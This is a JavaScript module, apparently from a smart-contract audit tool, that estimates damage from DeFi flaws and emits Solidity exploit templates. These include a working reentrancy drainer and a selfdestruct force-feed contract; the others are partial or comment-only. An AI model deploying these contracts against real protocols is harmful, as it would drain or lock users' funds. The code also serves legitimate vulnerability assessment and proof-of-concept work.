class ImpactEngine {
  constructor() {}

  // Calculate max drain from reentrancy
  calcReentrancyDrain(contractBalance, attackerDeposit) {
    const drainRounds = Math.ceil(contractBalance / attackerDeposit);
    return {
      contractBalance,
      attackerDeposit,
      drainRounds,
      totalDrain: Math.min(contractBalance, drainRounds * attackerDeposit),
      profit: contractBalance - attackerDeposit,
      impact: contractBalance > 0
        ? `Attacker deposits ${attackerDeposit} wei, then drains entire pool of ${contractBalance} wei in ~${drainRounds} reentrancy rounds. Net profit: ${contractBalance - attackerDeposit} wei`
        : 'No funds at risk (pool empty)',
    };
  }

  // Calculate flash loan attack profitability
  calcFlashLoanImpact(reserveBefore, reserveAfter, attackerBorrow, priceManipulation) {
    const priceBefore = reserveBefore.tokenA / reserveBefore.tokenB;
    const priceAfter = priceManipulation ? reserveAfter.tokenA / reserveAfter.tokenB : priceBefore;
    const priceImpact = Math.abs(priceAfter - priceBefore) / priceBefore * 100;
    return {
      priceBefore,
      priceAfter,
      priceImpactPercent: priceImpact.toFixed(2),
      profitable: priceImpact > 10,
      impact: priceImpact > 10
        ? `Flash loan can manipulate price by ${priceImpact.toFixed(2)}% — attacker borrows ${attackerBorrow}, manipulates pool, drains arbitrage profit`
        : `Price impact ${priceImpact.toFixed(2)}% — likely insufficient for profitable flash loan attack`,
    };
  }

  // Calculate overflow/underflow impact
  calcOverflowImpact(userBalance, depositAmount, type) {
    const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
    const MAX_UINT128 = BigInt(2n ** 128n - 1n);
    if (type === 'overflow') {
      const newBalance = BigInt(userBalance) + BigInt(depositAmount);
      const overflows = newBalance > MAX_UINT256;
      return {
        userBalance,
        depositAmount,
        newBalance: newBalance.toString(),
        overflows,
        impact: overflows
          ? `Balance overflows: ${userBalance} + ${depositAmount} wraps to ${newBalance.toString().slice(-20)}... — attacker deposits small amount and balance wraps to near zero or huge value`
          : 'No overflow at current values',
      };
    }
    if (type === 'underflow') {
      const newBalance = BigInt(userBalance) - BigInt(depositAmount);
      const underflows = newBalance < 0n;
      return {
        userBalance,
        withdrawAmount: depositAmount,
        newBalance: underflows ? (BigInt(MAX_UINT256) + newBalance + 1n).toString() : newBalance.toString(),
        underflows,
        impact: underflows
          ? `UNDERFLOW: ${userBalance} - ${depositAmount} wraps to massive value — attacker withdraws more than deposited and gets huge balance`
          : 'No underflow at current values',
      };
    }
  }

  // Calculate pool freeze impact
  calcPoolFreeze(totalDeposits, attackerDeposit, freezeMethod) {
    const userFundsLocked = totalDeposits - attackerDeposit;
    return {
      totalDeposits,
      attackerCost: attackerDeposit,
      userFundsLocked,
      dosRatio: (userFundsLocked / totalDeposits * 100).toFixed(2),
      impact: `Attacker spends ${attackerDeposit} wei to freeze ${userFundsLocked} wei of user funds (${(userFundsLocked / totalDeposits * 100).toFixed(2)}% of pool). ${freezeMethod}. Users cannot withdraw — permanent fund lock until attacker releases.`,
    };
  }

  // Generate exploit Solidity code
  generateExploitCode(vulnType, params) {
    const templates = {
      reentrancy: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITarget {
    function withdraw(uint256 amount) external;
    function deposit() external payable;
}

contract ReentrancyAttacker {
    ITarget public target;
    uint256 public drainAmount;

    constructor(address _target) {
        target = ITarget(_target);
    }

    function attack() external payable {
        drainAmount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (address(target).balance >= drainAmount) {
            target.withdraw(drainAmount);
        }
    }
}`,

      flashLoan: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFlashLoanProvider {
    function flashLoan(uint256 amount) external;
}

interface IPool {
    function swap(uint256 amountIn, bool direction) external returns (uint256);
    function getPrice() external view returns (uint256);
}

contract FlashLoanAttacker {
    IFlashLoanProvider public lender;
    IPool public pool;

    constructor(address _lender, address _pool) {
        lender = IFlashLoanProvider(_lender);
        pool = IPool(_pool);
    }

    function attack(uint256 borrowAmount) external {
        lender.flashLoan(borrowAmount);
    }

    function executeOperation(uint256 borrowedAmount) external {
        // Step 1: Manipulate price by swapping large amount
        pool.swap(borrowedAmount / 2, true);
        // Step 2: Exploit manipulated price (e.g., borrow more collateral)
        uint256 profit = pool.swap(borrowedAmount / 4, false);
        // Step 3: Repay flash loan, keep profit
    }
}`,

      overflow: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Pre-0.8.0 contracts are vulnerable to overflow/underflow
// Attacker deposits small amount, balance wraps around
// Result: attacker can withdraw MORE than deposited

contract OverflowAttacker {
    // If target uses unchecked arithmetic:
    // balance[msg.sender] += msg.value  (can overflow)
    // balance[msg.sender] -= amount    (can underflow to MAX_UINT)
    
    // Attack: Find a user with large balance
    // Send tiny amount to cause overflow
    // Withdraw massive amount due to underflow
}`,

      accessControl: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// If owner functions lack onlyOwner modifier or use tx.origin
// Attacker can call privileged functions directly

// Attack scenarios:
// 1. Call setFeeRate() to set fees to 100% — drain via fees
// 2. Call withdrawAll() if missing access control
// 3. Call upgradeTo() if proxy admin is unprotected
// 4. Call pause() to freeze all user funds (DOS/griefing)`,

      poolFreeze: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PoolFreezeAttacker {
    // Method 1: Deposit with zero-amount griefing
    // Create many micro-deposits that make withdrawal loop gas-exhaust
    
    // Method 2: Fallback/receive DOS
    // Force contract operations to fail via revert in callbacks
    
    // Method 3: Block withdrawal by holding referral/dependency
    // If withdrawal requires approval from another party who never responds
}`,

      selfDestruct: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceFeedAttacker {
    // Self-destruct forces ETH into target contract
    // This breaks accounting: contract.balance > tracked balances
    // If withdrawal uses address(this).balance, users can drain forced ETH
    // If withdrawal uses tracked balances, forced ETH is permanently stuck

    function attack(address target) external payable {
        selfdestruct(payable(target));
    }
}`,
    };

    return templates[vulnType] || `// Exploit code for ${vulnType}`;
  }
}

module.exports = ImpactEngine;
